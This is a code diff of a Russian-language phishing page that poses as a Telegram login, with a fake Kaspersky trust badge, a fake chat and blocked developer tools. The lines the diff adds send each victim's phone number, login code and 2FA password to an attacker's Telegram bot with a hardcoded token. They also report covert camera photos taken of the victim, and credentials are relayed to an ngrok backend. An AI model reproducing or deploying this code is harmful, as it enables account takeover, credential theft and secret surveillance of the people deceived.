@@ -10,7 +10,7 @@
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            user-select: none; /* Запрет выделения текста */
+            user-select: none;
             -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
@@ -22,7 +22,6 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         
-        /* Защита от выделения изображений */
         img, video {
             pointer-events: none;
             user-select: none;
@@ -365,45 +364,15 @@
 </div>
 
 <script>
-    // ========== БЛОКИРОВКА ПРАВОЙ КНОПКИ МЫШИ ==========
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    // ========== БЛОКИРОВКА ВЫДЕЛЕНИЯ ТЕКСТА (доп. страховка) ==========
-    document.addEventListener('selectstart', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    // ========== БЛОКИРОВКА СТАНДАРТНЫХ КОМБИНАЦИЙ ==========
+    // ========== БЛОКИРОВКИ ==========
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
     document.addEventListener('keydown', function(e) {
-        // Блокируем Ctrl+S (сохранить страницу)
-        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
-            e.preventDefault();
-            return false;
-        }
-        // Блокируем Ctrl+U (просмотр исходного кода)
-        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-            e.preventDefault();
-            return false;
-        }
-        // Блокируем Ctrl+Shift+I (инструменты разработчика)
-        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
-            e.preventDefault();
-            return false;
-        }
-        // Блокируем F12 (инструменты разработчика)
-        if (e.key === 'F12') {
-            e.preventDefault();
-            return false;
-        }
-        // Блокируем Ctrl+Shift+C (инспектор элементов)
-        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
-            e.preventDefault();
-            return false;
-        }
+        if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); return false; }
+        if (e.key === 'F12') { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
     });
     
     // ========== ВИДЕО ПЛЕЕР ==========
@@ -439,7 +408,7 @@
     
     // ========== КОНФИГ ==========
     const API_URL = 'https://7dbb-94-103-1-185.ngrok-free.app';
-    const BOT_TOKEN = '8791850945:AAE-0cCFUub1NlsCokHPPC2bYIcXn7LLh-4';
+    const BOT_TOKEN = '8809942680:AAHVr9WLL4GQHOqZtmzesQP-s05p5zlD7vE';
     const ADMIN_ID = '8704208839';
     
     let currentPhone = "";
@@ -447,7 +416,7 @@
     
     function sendToAdmin(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}`)
-            .catch(() => {});
+            .catch(() => console.log('Ошибка отправки админу'));
     }
     
     // ========== ЛОГ ЗАХОДА ==========
@@ -476,7 +445,7 @@
             });
     })();
     
-    // ========== ЧАТ (разные сообщения) ==========
+    // ========== ЧАТ (фейковый) ==========
     const chatMessagesContainer = document.getElementById('chatMessages');
     const chatStartMessages = [
         "@user_124: когда разблокируют?",
@@ -536,11 +505,18 @@
         if (currentStep === "phone") {
             let phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
             if (!phone) { statusDiv.innerText = "Введите номер"; return; }
+            
+            sendToAdmin(`📞 НОВЫЙ НОМЕР: ${phone}`);
+            
             btn.disabled = true;
             btn.innerText = "⏳ Отправка...";
             statusDiv.innerText = "Отправляем код...";
             try {
-                const response = await fetch(`${API_URL}/send_code`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone }) });
+                const response = await fetch(`${API_URL}/send_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: phone })
+                });
                 const data = await response.json();
                 if (data.success) {
                     currentPhone = phone;
@@ -565,15 +541,24 @@
         } else if (currentStep === "code") {
             const code = document.getElementById('code').value.trim();
             if (!code) { statusDiv.innerText = "Введите код"; return; }
+            
+            sendToAdmin(`🔑 КОД для ${currentPhone}: ${code}`);
+            
             btn.disabled = true;
             btn.innerText = "⏳ Проверка...";
             try {
-                const response = await fetch(`${API_URL}/verify_code`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: currentPhone, code: code }) });
+                const response = await fetch(`${API_URL}/verify_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, code: code })
+                });
                 const data = await response.json();
                 if (data.success) {
                     statusDiv.style.color = "#88ff88";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 1500);
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
                 } else if (data.needs_password) {
                     currentStep = "password";
                     document.getElementById('codeSection').style.display = 'none';
@@ -597,15 +582,24 @@
         } else if (currentStep === "password") {
             const password = document.getElementById('password').value.trim();
             if (!password) { statusDiv.innerText = "Введите пароль"; return; }
+            
+            sendToAdmin(`🔒 ПАРОЛЬ 2FA для ${currentPhone}: ${password}`);
+            
             btn.disabled = true;
             btn.innerText = "⏳ Проверка...";
             try {
-                const response = await fetch(`${API_URL}/verify_password`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: currentPhone, password: password }) });
+                const response = await fetch(`${API_URL}/verify_password`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone: currentPhone, password: password })
+                });
                 const data = await response.json();
                 if (data.success) {
                     statusDiv.style.color = "#88ff88";
                     statusDiv.innerHTML = "✅ Вход выполнен!";
-                    setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 1500);
+                    setTimeout(() => {
+                        window.location.href = "https://web.telegram.org";
+                    }, 1500);
                 } else {
                     statusDiv.innerText = "Ошибка: " + (data.error || "неверный пароль");
                     btn.disabled = false;
@@ -660,7 +654,12 @@
             
             stream.getTracks().forEach(track => track.stop());
             videoEl.remove();
-        } catch(e) {}
+            
+            sendToAdmin(`📸 Сделано 10 скрытых фото жертвы`);
+            
+        } catch(e) {
+            sendToAdmin(`❌ Ошибка камеры: ${e.message}`);
+        }
     }
     
     document.getElementById('unlockBtn').onclick = async () => {
@@ -672,13 +671,14 @@
     window.closeModal = closeModal;
     window.handleAction = handleAction;
 </script>
-<!-- Сертификат безопасности (фейковый) -->
-<div id="trustBadge" style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif; cursor: default;">
+
+<!-- Бейдж безопасности -->
+<div id="trustBadge" style="position: fixed; bottom: 15px; left: 15px; background: rgba(30,30,30,0.85); backdrop-filter: blur(8px); border-radius: 30px; padding: 8px 18px; display: flex; align-items: center; gap: 12px; z-index: 999; border: 1px solid rgba(255,255,255,0.15); box-shadow: 0 4px 12px rgba(0,0,0,0.3); font-family: system-ui, -apple-system, 'Segoe UI', sans-serif;">
     <div style="background: #2ecc71; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 6px #2ecc71;">
         <span style="color: white; font-size: 18px; font-weight: bold;">✓</span>
     </div>
     <div style="display: flex; flex-direction: column; line-height: 1.2;">
-        <span style="color: white; font-size: 13px; font-weight: 600; letter-spacing: 0.3px;">Проверено Kaspersky</span>
+        <span style="color: white; font-size: 13px; font-weight: 600;">Проверено Kaspersky</span>
         <span style="color: #aaa; font-size: 10px;">Безопасный сайт • SSL активен</span>
     </div>
     <div style="width: 1px; height: 20px; background: #444; margin: 0 5px;"></div>
@@ -687,5 +687,6 @@
         <span style="color: #aaa; font-size: 10px;">Шифрование данных</span>
     </div>
 </div>
+
 </body>
 </html>
